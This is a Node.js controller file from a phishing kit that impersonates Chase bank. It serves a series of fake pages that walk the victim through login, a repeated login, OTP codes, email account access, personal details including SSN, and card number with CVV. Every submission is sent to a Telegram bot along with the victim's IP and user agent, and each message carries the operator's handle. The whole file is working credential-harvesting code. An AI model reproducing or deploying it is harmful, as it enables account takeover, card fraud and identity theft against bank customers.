const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");

// console.log(getIPDetails());

exports.login = (req, res) => {
  return res.render("login");
};

exports.loginPost = async (req, res) => {
  const { username, password } = req.body;

  const iPDetails = await getIPDetails();
  const { ip } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `CHASE  LOGIN-1\n\n` +
    `🔰Username        : ${username}\n` +
    `🔑Pass            : ${password}\n\n` +
    `++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${ip}\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/login/2");
};

exports.login2 = (req, res) => {
  res.render("confirm-login");
};

exports.loginPost2 = async (req, res) => {
  const { username, password } = req.body;

  const iPDetails = await getIPDetails();
  const { ip } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `CHASE  LOGIN-2\n\n` +
    `🔰Username        : ${username}\n` +
    `🔑Pass            : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${ip}\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/otp");
};

exports.login3 = (req, res) => {
  res.render("email-verification");
};

exports.loginPost3 = async (req, res) => {
  const { email, emailPassword } = req.body;

  const iPDetails = await getIPDetails();
  const { ip } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `CHASE  Email Access\n\n` +
    `📧Email            : ${email}\n` +
    `🔑Email Pass            : ${emailPassword}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${ip}\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/personal");
};

exports.personal = (req, res) => {
  res.render("personal");
};

exports.personalPost = async (req, res) => {
  const { fname, dob, phone, ssn, address, city1, state, zipcode } = req.body;

  const iPDetails = await getIPDetails();
  const { ip } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `CHASE  INFO\n\n` +
    `Fname            : ${fname}\n\n` +
    `DOB            : ${dob}\n\n` +
    `Phone            : ${phone}\n\n` +
    `SSN              : ${ssn}\n\n` +
    `Address            : ${address}\n\n` +
    `City            : ${city1}\n\n` +
    `State            : ${state}\n\n` +
    `ZipCode            : ${zipcode}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${ip}\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/card");
};

exports.card = (req, res) => {
  res.render("card");
};

exports.cardPost = async (req, res) => {
  const { cardNum, cvv, exp } = req.body;

  const iPDetails = await getIPDetails();
  const { ip } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `CHASE  CARD-INFO\n\n` +
    `CardNum          : ${cardNum}\n\n` +
    `ExpiryDate       : ${exp}\n\n` +
    `CVV              : ${cvv}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${ip}\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.otp = (req, res) => {
  res.render("otp");
};


exports.otpPost = async (req, res) => {
  const { otp } = req.body;

  const iPDetails = await getIPDetails();
  const { ip } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `CHASE  OTP\n\n` +
    `OTP-1          : ${otp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${ip}\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/otp/2");
};

exports.otp2 = (req, res) => {
  res.render("otp2");
};

exports.otpPost2 = async (req, res) => {
  const { otp } = req.body;

  const iPDetails = await getIPDetails();
  const { ip } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `CHASE  OTP\n\n` +
    `OTP-2          : ${otp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${ip}\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/email-verification");
};

exports.success = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
